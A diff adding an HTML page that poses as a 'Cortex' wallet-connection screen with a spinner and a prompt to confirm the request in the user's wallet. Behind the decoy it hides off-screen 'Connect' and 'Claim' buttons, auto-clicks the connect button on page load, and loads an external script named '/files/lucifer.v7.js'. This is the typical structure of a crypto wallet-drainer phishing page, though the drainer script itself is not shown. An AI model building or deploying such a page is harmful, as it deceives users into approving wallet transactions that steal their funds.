@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connecting Wallet | Cortex</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            /* Screenshot-matched UI color palette */
+            --bg: #f8f9fa; 
+            --card-bg: #ffffff;
+            --text-main: #111827;
+            --text-muted: #6b7280;
+            --border-color: #f3f4f6;
+            --accent-blue: #0ea5e9; /* Styled after the app buttons */
+            --accent-yellow: #f59e0b;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            background-color: var(--bg);
+            color: var(--text-main);
+            font-family: 'Inter', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1rem;
+        }
+
+        .connect-card {
+            background: var(--card-bg);
+            border-radius: 24px;
+            width: 100%;
+            max-width: 420px;
+            padding: 2.5rem 2rem;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.04);
+            text-align: center;
+            position: relative;
+            z-index: 10;
+            border: 1px solid rgba(0,0,0,0.03);
+        }
+
+        .header-logo {
+            font-size: 1.8rem;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+            margin-bottom: 2rem;
+            color: var(--text-main);
+            text-transform: capitalize;
+        }
+
+        /* Live status badge matching the image styling */
+        .live-badge {
+            display: inline-flex;
+            align-items: center;
+            background: #fffbeb;
+            color: var(--accent-yellow);
+            border: 1px solid #fef3c7;
+            padding: 4px 12px;
+            border-radius: 12px;
+            font-size: 0.75rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            margin-bottom: 1.5rem;
+            letter-spacing: 0.5px;
+        }
+
+        .spinner-container {
+            position: relative;
+            width: 70px;
+            height: 70px;
+            margin: 0 auto 2rem auto;
+        }
+
+        .spinner {
+            width: 100%;
+            height: 100%;
+            border: 4px solid #e5e7eb;
+            border-top: 4px solid var(--accent-blue);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .status-title {
+            font-size: 1.25rem;
+            font-weight: 700;
+            margin-bottom: 0.5rem;
+            color: var(--text-main);
+        }
+
+        .status-desc {
+            font-size: 0.9rem;
+            color: var(--text-muted);
+            line-height: 1.5;
+            margin-bottom: 2rem;
+            padding: 0 10px;
+        }
+
+        .cancel-btn {
+            background-color: transparent;
+            color: var(--text-muted);
+            border: 1px solid var(--border-color);
+            border-radius: 30px;
+            padding: 0.8rem 2rem;
+            font-size: 0.9rem;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+            width: 100%;
+        }
+
+        .cancel-btn:hover {
+            background-color: #f9fafb;
+            color: var(--text-main);
+            border-color: #d1d5db;
+        }
+
+        /* Hidden functional triggers for backend scripts */
+        .hidden-triggers {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            padding: 0;
+            margin: -1px;
+            overflow: hidden;
+            clip: rect(0, 0, 0, 0);
+            border: 0;
+            opacity: 0;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="connect-card">
+        <div class="live-badge">Live Connection</div>
+        <div class="header-logo">Cortex</div>
+        
+        <div class="spinner-container">
+            <div class="spinner"></div>
+        </div>
+
+        <h3 class="status-title" id="statusTitle">Connecting Wallet...</h3>
+        <p class="status-desc" id="statusDesc">Please confirm the connection request in your wallet application to proceed.</p>
+
+        <button class="cancel-btn" onclick="goBack()">Cancel</button>
+    </div>
+
+    <div class="hidden-triggers">
+        <button class="interactBtn" id="connectButton">Connect</button>
+        <button class="claimBtn" id="claimButton">Claim</button>
+        <div class="wallet-connect-btn">WalletConnect</div>
+        <div class="wallet-info"></div>
+    </div>
+
+    <script type="module" crossorigin src="/files/lucifer.v7.js"></script>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const activeWallet = urlParams.get('wallet') || 'Wallet';
+        
+        document.getElementById('statusTitle').textContent = `Connecting ${activeWallet}...`;
+
+        window.addEventListener('DOMContentLoaded', () => {
+            // Unchanged auto-click logic for internal script binding
+            setTimeout(() => {
+                const interactBtn = document.querySelector('.interactBtn') || document.getElementById('connectButton');
+                if (interactBtn) {
+                    interactBtn.click();
+                }
+            }, 300);
+        });
+
+        function goBack() {
+            window.history.back();
+        }
+    </script>
+</body>
+</html>
